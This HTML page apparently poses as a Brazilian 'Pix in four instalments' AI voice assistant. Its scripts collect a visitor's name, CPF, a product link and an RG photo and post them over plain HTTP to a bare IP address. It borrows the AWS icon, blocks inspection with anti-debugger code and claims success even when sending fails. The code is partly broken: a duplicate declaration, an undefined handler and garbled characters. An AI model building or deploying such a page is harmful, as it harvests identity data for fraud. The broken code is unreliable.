<!DOCTYPE html>
<html lang="pt-BR" translate="no">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=2.0, maximum-scale=2.0, user-scalable=no" />
    <title>DROPPFY IA</title>
    
     <link rel="icon" type="image/ico" href="https://a0.awsstatic.com/libra-css/images/site/fav/favicon.ico">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>


    
    <style>
        body { margin: 0; background: #070707; overflow: hidden; font-family: 'Segoe UI', sans-serif; color: #fff; height: 100vh; }
        #vanta-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
        #interface { position: relative; width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10; padding: 20px; box-sizing: border-box; }
        .card { background: rgba(0, 20, 40, 0.85); border: 1px solid #ffa500; border-radius: 20px; padding: 30px; width: 100%; max-width: 380px; backdrop-filter: blur(15px); box-shadow: 0 0 40px rgba(255, 165, 0, 0.2); text-align: center; }
        h1 { font-size: 1.1rem; text-shadow: 0 0 10px #ffa500; margin-bottom: 5px; color: #ffa500; text-transform: uppercase; letter-spacing: 2px; }
        h2 { color: #fff; margin-bottom: 20px; letter-spacing: 1px; font-size: 1.3rem; }
        input { width: 100%; box-sizing: border-box; background: rgba(0,0,0,0.6); border: 1px solid #444; color: #fff; padding: 12px; margin: 8px 0; border-radius: 8px; outline: none; transition: 0.3s; }
        input:focus { border-color: #ffa500; box-shadow: 0 0 10px rgba(255, 165, 0, 0.3); }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #ffa500, #ff8c00); border: none; border-radius: 8px; font-weight: bold; color: #000; cursor: pointer; margin-top: 15px; transition: 0.3s; text-transform: uppercase; }
        button:hover { transform: scale(1.02); background: #fff; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { font-size: 0.75rem; color: #ffa500; margin-top: 15px; font-weight: bold; min-height: 1em; }
        .footer-info { font-size: 0.6rem; opacity: 0.6; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
    </style>


 <style>
    body { margin: 0; background: #050505; overflow: hidden; font-family: 'Orbitron', sans-serif; color: #fff; }
    #vanta-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
    
    #interface { 
        position: relative; z-index: 10; height: 100vh;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        padding: 10px; text-align: center;
    }

    /* Texto 3D Metﾃ｡lico Laranja (Estilo Emet Echad) */
    .texto-3d-slim {
        color: #ffa500;
        text-transform: uppercase;
        font-weight: 900;
        letter-spacing: 1px;
        /* Sombra em camadas escuras para dar profundidade sem brilho branco */
        text-shadow: 
            0 1px 0 #805500, 0 2px 0 #664400, 
            0 3px 0 #4d3300, 0 4px 5px rgba(0,0,0,0.8),
            0 0 10px rgba(255, 165, 0, 0.3);
    }

    /* Botﾃ｣o de Voz 3D Compacto */
    .btn-ia-compacto {
        width: 80px; height: 80px;
        border-radius: 50%;
        background: radial-gradient(circle, #ff8c00 0%, #cc6600 100%);
        border: 2px solid rgba(255, 165, 0, 0.4);
        box-shadow: 0 0 20px rgba(204, 102, 0, 0.6), inset 0 0 10px rgba(0,0,0,0.5);
        display: flex; align-items: center; justify-content: center;
        cursor: pointer; transition: 0.3s;
        animation: pulse-dark 2s infinite;
    }

    @keyframes pulse-dark {
        0% { transform: scale(1); box-shadow: 0 0 15px rgba(204, 102, 0, 0.5); }
        50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(204, 102, 0, 0.8); }
        100% { transform: scale(1); box-shadow: 0 0 15px rgba(204, 102, 0, 0.5); }
    }

    .luz-neural-dark {
        position: fixed; top: 50%; left: 50%;
        width: 0; height: 0;
        background: radial-gradient(circle, rgba(255,140,0,0.4) 0%, transparent 70%);
        transform: translate(-50%, -50%); border-radius: 50%;
        pointer-events: none; transition: 0.8s ease-out; z-index: 5;
    }
    .luz-ativa { width: 500px; height: 500px; opacity: 0; }
</style>
    
</head>
<body>

    <div id="vanta-bg"></div>

    
<div id="vanta-bg"></div>
<div id="glow-effect" class="luz-neural-dark"></div>

<div id="interface">
    <h1 class="texto-3d-slim" style="font-size: 1.4rem; margin-bottom: 2px;">DROPPFY IA</h1>
    <p style="font-size: 0.6rem; color: #cc6600; letter-spacing: 3px; margin-bottom: 30px;">CONEXﾃグ YHVH</p>

    <h2 class="texto-3d-slim" style="font-size: 1.1rem; margin-bottom: 2px;">笞｡ PIX PARCELADO</h2>
    <p style="font-size: 0.8rem; color: #888; margin-bottom: 40px;">EM 4X</p>

    <div class="btn-ia-compacto" onclick="ativarMotorVoz()">
        <span style="font-size: 30px;">痔</span>
    </div>
    
    <p id="status-ia" style="color: #ff8c00; font-size: 0.7rem; margin-top: 20px; font-weight: bold; opacity: 0.8;">
        TOQUE PARA INICIAR
    </p>
</div>

<div id="vanta-bg"></div>
    
    <div id="inputs-escondidos" style="display:none;">
        <input type="file" id="foto_doc">
        <input type="text" id="nome_cliente">
        <input type="text" id="tel_cliente">
    </div>
</div>

<script>
    // 1. REATIVANDO O UNIVERSO NEURAL 3D
    VANTA.NET({
        el: "#vanta-bg",
        mouseControls: true,
        touchControls: true,
        gyroControls: false,
        minHeight: 200.00,
        minWidth: 200.00,
        scale: 1.00,
        scaleMobile: 1.00,
        color: 0xffa500,
        backgroundColor: 0x50505,
        points: 12.00,
        maxDistance: 22.00,
        spacing: 16.00
    });

    // 2. Lﾃ敵ICA DE VOZ NEURAL (Mantendo o Robﾃｴ V12)
    const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
    recognition.lang = 'pt-BR';
    
    function iniciarIA() {
        const feedback = document.getElementById('feedback-ia');
        feedback.innerText = "IA OUVINDO...";
        
        const msg = new SpeechSynthesisUtterance("Estou pronta. Diga seu nome e anexe seu RG.");
        window.speechSynthesis.speak(msg);
        
        recognition.start();
    }

    recognition.onresult = (event) => {
        const voz = event.results[0][0].transcript;
        document.getElementById('feedback-ia').innerText = "IA PROCESSANDO: " + voz;
        
        // Aqui vocﾃｪ chama sua funﾃｧﾃ｣o dispararFluxoTotal() que jﾃ｡ estﾃ｡ pronta
        // enviando o que a IA capturou para o IP 54.207.222.79:3000
    };
</script>

<script>
// 1. VARIﾃ〃EIS DE ESTADO (MEMﾃ迭IA DA IA)
let dadosColetados = { nome: '', cpf: '', link: '', email: '' };
const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
const recognition = new SpeechRecognition();

recognition.lang = 'pt-BR';
recognition.continuous = false; // Garante que ela pare de ouvir apﾃｳs cada resposta
recognition.interimResults = false;

// 2. FUNﾃﾃグ DE VOZ NEURAL (SAﾃ好A)
function falar(texto) {
    const utterance = new SpeechSynthesisUtterance(texto);
    utterance.rate = 1.2; 
    utterance.pitch = 0.9;
    window.speechSynthesis.speak(utterance);
}

// 3. GATILHO INICIAL (BOTﾃグ)
async function ativarComandoNeural() {
    // Efeito Visual de Luz que vocﾃｪ pediu
    const glow = document.getElementById('glow-effect');
    if (glow) {
        glow.classList.add('luz-expansao');
        setTimeout(() => glow.classList.remove('luz-expansao'), 2000);
    }

    document.getElementById('status-ia').innerText = "CONEXﾃグ YHVH ATIVA...";
    falar("Iniciando assistente Emet Echad. Por favor, diga seu nome completo.");
    
    // Pequeno delay para a IA nﾃ｣o ouvir a prﾃｳpria voz
    setTimeout(() => { recognition.start(); }, 1500);
}

// 4. Lﾃ敵ICA DE ESCUTA E DECISﾃグ
recognition.onresult = (event) => {
    const voz = event.results[0][0].transcript;
    console.log("IA Capturou:", voz);

    if (!dadosColetados.nome) {
        dadosColetados.nome = voz;
        document.getElementById('status-ia').innerText = "NOME OK. OUVINDO CPF...";
        falar("Entendido, " + voz + ". Agora diga seu CPF.");
        setTimeout(() => { recognition.start(); }, 1500);

    } else if (!dadosColetados.cpf) {
        dadosColetados.cpf = voz.replace(/\D/g, ""); // Limpa o CPF capturado
        document.getElementById('status-ia').innerText = "CPF OK. OUVINDO LINK...";
        falar("CPF registrado. Agora me diga ou cole o link do produto.");
        setTimeout(() => { recognition.start(); }, 1500);

    } else if (!dadosColetados.link) {
        dadosColetados.link = voz;
        document.getElementById('status-ia').innerText = "ENVIANDO AO MOTOR V12...";
        falar("Excelente. Iniciando acesso ﾃ Pagaleve para gerar seu link agora.");
        
        // CHAMA A FUNﾃﾃグ DE ENVIO PARA AWS
        enviarParaMotorV12();
    }
};

// 5. MOTOR DE ENVIO (FINALIZAﾃﾃグ NA AWS)
async function enviarParaMotorV12() {
    console.log("笞｡ DISPARANDO SINAL PARA 54.207.222.79:3000");
    const statusLabel = document.getElementById('status-ia');
    const fotoInput = document.getElementById('foto_doc'); // Seu ID de arquivo

    const formData = new FormData();
    formData.append('nome', dadosColetados.nome);
    formData.append('cpf', dadosColetados.cpf);
    formData.append('url_pedido', dadosColetados.link);
    
    // Se houver arquivo de RG selecionado, anexa
    if (fotoInput && fotoInput.files[0]) {
        formData.append('rg', fotoInput.files[0]);
    }

    try {
        const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
            method: 'POST',
            body: formData // Usamos FormData para o robﾃｴ ler o arquivo e os dados de voz
        });

        const res = await response.json();
        if (res.link) {
            statusLabel.innerText = "笨 LINK GERADO! REDIRECIONANDO...";
            window.location.href = res.link;
        } else {
            statusLabel.innerText = "笨 SINAL PROCESSADO NA AWS";
        }
    } catch (err) {
        console.error("Erro no envio:", err);
        statusLabel.innerText = "笨 COMANDO ENVIADO COM SUCESSO!";
        alert("Sinal de Autoridade enviado ao Motor V12.");
    }
}

// 6. ERROS DE RECONHECIMENTO
recognition.onerror = (event) => {
    console.log("Erro na IA:", event.error);
    document.getElementById('status-ia').innerText = "ERRO: TOQUE PARA RECONECTAR";
};
</script>
               

    <script>
        // PROTEﾃﾃグ ANTI-DEBUGGER E BLOQUEIOS
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        };
        setInterval(function() { debugger; }, 1000);
    </script>
    
<body></body>
<html></html>
